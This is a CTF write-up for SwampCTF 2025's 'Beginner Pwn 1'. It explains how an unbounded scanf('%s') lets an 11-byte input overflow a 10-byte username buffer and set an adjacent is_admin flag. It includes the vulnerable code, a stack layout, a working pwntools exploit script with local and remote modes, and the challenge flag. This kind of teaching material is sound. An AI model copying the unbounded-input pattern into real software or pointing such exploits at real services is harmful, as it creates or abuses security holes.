---
title: "Beginner Pwn 1 🧠 – Stack Corruption via Overflow (SwampCTF 2025)"
tags: [CTF, binary exploitation, buffer overflow, stack corruption, pwn]
---

# Beginner Pwn 1 🧠

![pwntools](https://img.shields.io/badge/pwntools-✔️-brightgreen)
![Difficulty](https://img.shields.io/badge/difficulty-Easy-blue)
![Category](https://img.shields.io/badge/category-Pwn-orange)
![CTF](https://img.shields.io/badge/Event-SwampCTF%202025-purple)

> Are you really admin?
> This challenge serves as an introduction to pwn that new ctfers can use to grasp basic pwn concepts.

This challenge is a perfect illustration of how overflowing a local buffer on the stack can unintentionally alter adjacent variables — and grant access you're not supposed to have. 👀

## 📚 Table of Contents

- [Initial Analysis 🕵️](#initial-analysis-)
- [The Vulnerability 💣](#the-vulnerability-)
- [Stack Layout Breakdown 📐](#stack-layout-breakdown-)
- [Exploitation 💥](#exploitation-)
- [Exploit Script 🧪](#exploit-script-)
- [Conclusion 🧠](#conclusion-)

## Initial Analysis 🕵️

### Checksec result

![image](https://github.com/user-attachments/assets/163935b6-3fea-47bc-88c5-92f47605b8d7)

- RELRO: Partial
- Stack Canary: ❌
- NX: ✅
- PIE: ❌

The program asks you for a `username`, prints a debug view of the stack, then checks if you're an `admin`. If you are, you can print the flag. Otherwise, you get denied.

![image](https://github.com/user-attachments/assets/9e606bd9-2d9a-4d67-87e0-f4647b7c649f)

There’s no authentication — only a **boolean check**:

```
bool is_admin = false;
char username[10];
...
scanf("%s", username);
...
if (is_admin == true) {
   print_flag();
}
```

But here's the issue: `scanf("%s", username)` **does not limit input size**. 

So if you type more than 10 bytes, you start **overwriting `is_admin`**, which is placed **after** `username` on the stack.

### Ghidra dump

![Ghidra dump](https://github.com/user-attachments/assets/422bce68-495a-48e3-9b61-1cc088faed50)

## The Vulnerability 💣

This is a classic **stack-based buffer overflow**:
- `username` has 10 bytes
- Input is not bounded
- `is_admin` is just a few bytes after `username`
- `scanf("%s", ...)` stops at null byte, but has no size restriction

By overflowing `username` with **more than 10 bytes**, you overwrite `is_admin` (a `bool`, usually 1 byte) — and any **non-zero value** will make the condition `if (is_admin)` true!

## Stack Layout Breakdown 📐

Looking at Ghidra:

```
char local_19[2];      // 'choice' input
char username[10];     // local_17 to local_f
bool is_admin          // local_d
```

So memory-wise:

```
| local_19[1] |
| local_19[0] |
| username[9] |
| username[8] |
|    ...      |
| username[0] |
| is_admin    | ← we want to corrupt this
```

## Exploitation 💥

The strategy is:

- Input more than 10 characters as your `username`
- Add **at least 1 non-zero byte after that**
- This byte lands into `is_admin`, setting it to a truthy value (`!= 0`)
- You bypass the admin check and print the flag

Simple payload:

```
AAAAAAAAAAA
```

Where:
- `A` * 10 fills `username`
- `A` n°11 goes into `is_admin`, making it true (ASCII 0x41)

## Exploit Script 🧪

```python
from pwn import *
import argparse
import sys

# Constants
OVERFLOW_INPUT = b"A" * 11  # 10 for username + 1 byte to set is_admin=true

def get_flag(io):
    """
    Send overflow input and extract flag.
    """
    io.sendline(OVERFLOW_INPUT)  # Overflow username + set is_admin = true
    io.recvuntil(b"flag? (y/n) ")
    io.sendline(b"y")

    # Try to extract the flag
    try:
        line = io.recvline(timeout=2)
        if b"swamp" in line.lower():
            print("[+] Flag:", line.decode().strip())
        else:
            print("[!] Unexpected output:", line.decode().strip())
    except EOFError:
        print("[-] Failed to receive flag output.")

def run_local(path):
    """
    Launch local binary process.
    """
    print(f"[*] Running locally: {path}")
    elf = ELF(path)
    context.binary = elf
    return process(path)

def run_remote(host, port):
    """
    Connect to remote service.
    """
    print(f"[*] Connecting to {host}:{port}")
    return remote(host, port)

def main():
    parser = argparse.ArgumentParser(description="SwampCTF - is_admin exploit")
    subparsers = parser.add_subparsers(dest="mode", required=True)

    # --local ./binary
    local_parser = subparsers.add_parser("local", help="Run exploit locally")
    local_parser.add_argument("binary", type=str, help="Path to local binary")

    # --remote
    remote_parser = subparsers.add_parser("remote", help="Run exploit remotely")
    remote_parser.add_argument("ip", type=str, help="Remote IP or hostname")
    remote_parser.add_argument("port", type=int, help="Remote port")

    args = parser.parse_args()

    # Setup target
    if args.mode == "local":
        io = run_local(args.binary)
    elif args.mode == "remote":
        io = run_remote(args.ip, args.port)
    else:
        print("[-] Unknown mode")
        sys.exit(1)

    get_flag(io)
    io.close()

if __name__ == "__main__":
    main()
```

![Flag displayed](https://github.com/user-attachments/assets/d29fc466-309f-40dd-b84b-1a87f1e58266)

`[+] Flag: Here is your flag! swampCTF{n0t_@11_5t@ck5_gr0w_d0wn}`

## Conclusion 🧠

This challenge demonstrates:

- How lack of input bounds (e.g. `scanf("%s")`) leads to overflows
- How local variable placement affects exploitability
- That even a single-byte overwrite can give admin access!

🔙 [Back to SwampCTF 2025 Writeups](../../)
